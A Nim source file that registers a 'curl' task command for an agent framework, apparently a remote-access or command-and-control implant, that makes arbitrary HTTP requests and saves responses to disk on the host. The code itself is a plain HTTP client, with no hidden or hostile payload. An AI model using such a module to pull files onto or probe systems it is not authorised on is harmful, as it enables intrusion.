import std/[httpclient, json, os, strutils, net]
import core/types
import commands/registry

proc curlExecute(taskId: string, params: JsonNode, state: AgentState,
                 send: SendMsg): TaskResult =
  let url = params{"url"}.getStr("")
  if url.len == 0:
    return TaskResult(output: "Error: url is required", status: "error", completed: true)

  let meth       = params{"method"}.getStr("GET").toUpperAscii()
  let data       = params{"data"}.getStr("")
  let headersRaw = params{"headers"}.getStr("")
  let outputPath = params{"output"}.getStr("")

  try:
    let client = newHttpClient(timeout = 60000)
    defer: client.close()

    if headersRaw.len > 0:
      var hdrs = newHttpHeaders()
      for line in headersRaw.splitLines():
        let idx = line.find(':')
        if idx > 0:
          hdrs[line[0 ..< idx].strip()] = line[idx + 1 .. ^1].strip()
      client.headers = hdrs

    let httpMeth = case meth
      of "GET":    HttpGet
      of "POST":   HttpPost
      of "PUT":    HttpPut
      of "DELETE": HttpDelete
      of "HEAD":   HttpHead
      of "PATCH":  HttpPatch
      else:        HttpGet

    let resp = client.request(url, httpMethod = httpMeth, body = data)
    let body = resp.body

    if outputPath.len > 0:
      let fullPath = if isAbsolute(outputPath): outputPath else: state.cwd / outputPath
      writeFile(fullPath, body)
      return TaskResult(
        output:    "HTTP " & resp.status & " -> " & $body.len & " bytes saved to " & fullPath,
        status:    "success",
        completed: true)
    else:
      return TaskResult(
        output:    "HTTP " & resp.status & "\n" & body,
        status:    "success",
        completed: true)
  except Exception as e:
    return TaskResult(output: "Error: " & e.msg, status: "error", completed: true)

proc initCurl*() =
  register("curl", curlExecute)
